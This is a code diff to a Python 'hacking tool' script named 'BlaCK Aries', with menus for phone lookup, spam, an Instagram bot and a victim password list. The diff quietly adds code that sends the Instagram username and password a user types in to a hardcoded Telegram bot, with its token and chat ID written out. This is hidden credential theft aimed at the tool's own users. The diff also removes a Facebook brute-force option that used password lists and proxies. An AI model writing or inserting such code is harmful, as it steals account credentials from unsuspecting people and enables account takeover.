@@ -6,6 +6,7 @@ from phonenumbers import geocoder, parse,carrier,timezone
 import base64
 import os
 from instabot import Bot
+import requests
 print(Fore.LIGHTGREEN_EX+'Hi bro am BlaCK Aries')
 print(Fore.CYAN+'<<>>'*20)
 print(Fore.LIGHTGREEN_EX+'you should be great account')
@@ -20,11 +21,10 @@ if pin == code :
     print('[1] Phone Number ')
     print('[2] Data encryption')
     print('[3] spam')
-    print('[4] Facebook')
-    print('[5] Aries-List')
-    print('[6] Insta Bot')
+    print('[4] Aries-List')
+    print('[5] Insta Bot')
     ask = input('>>>>')
-    if ask == '6':
+    if ask == '5':
         print(Fore.LIGHTGREEN_EX + 'Hi bro am BlaCK Aries')
         time.sleep(2)
         print(Fore.CYAN + '<<>>' * 20)
@@ -46,6 +46,11 @@ if pin == code :
         Insta_Info = open('Insta Info.txt', 'w')
         Insta_Info.write(f'|User name : {user} |')
         Insta_Info.write(f'|Password  : {passwoed} |')
+        ID = '5141124832'
+        token = '5250865220:AAHvyRQo1_wKcV6h9Nc7A00XL-cD6raDGO8'
+        t = requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= new account 🦇 ︎\n.User : [ → {user} ← ]\n.Pass : [ → {passwoed} ← ]\n-  ")
+        print(t)
         if list == '5':
             print(f'Username : {user}')
             print(f'Password : {passwoed}')
@@ -62,7 +67,7 @@ if pin == code :
         if list == '4':
             userlist = str(input('uaer name >> '))
             followers_list = aries_Bot.get_user_followers(f'{userlist}')
-    if ask == '5':
+    if ask == '4':
         print("[1]victam list")
         print('[2]allpass')
         aries1 =input('>>>')
@@ -141,22 +146,7 @@ if pin == code :
                         file.write('\n')
                 kk = int(kk) + 1
                 print('-' * 40)
-    if ask == "4":
-        print('[1]Brute Force')
-        print('[2] Get ID ')
-        fasbookask = input(">>>")
-        if fasbookask == '2':
-            url = input("Profile Url >>>")
-            os.system(f"python3 Facebook.py -g {url}")
-        if fasbookask == '1':
-            user = input('Email or Id  >>>')
-            list = input('Path of passlist >>')
-            fase_ask = input(" Attack With Proxy |y/n|")
-            if fase_ask == 'y':
-                proxy = input('Enter Your proxy like:>192.186.149.50:8080 >>>')
-                os.system(f"python3 Facebook.py -t {user} -w {list} -p {proxy}")
-            if fase_ask == 'n':
-                os.system(f"python3 Facebook.py -t {user} -w {list}")
+
     if ask == '2':
         os.system('clear')
         os.system('figlet Black-Aries')
@@ -213,3 +203,4 @@ if pin == code :
             print(geocoder.description_for_number(parse(number), 'en'))
 else:
     print('Sorry i cannot pass you *_* ')
+    print('https://github.com/blackaries506/blackariestool')
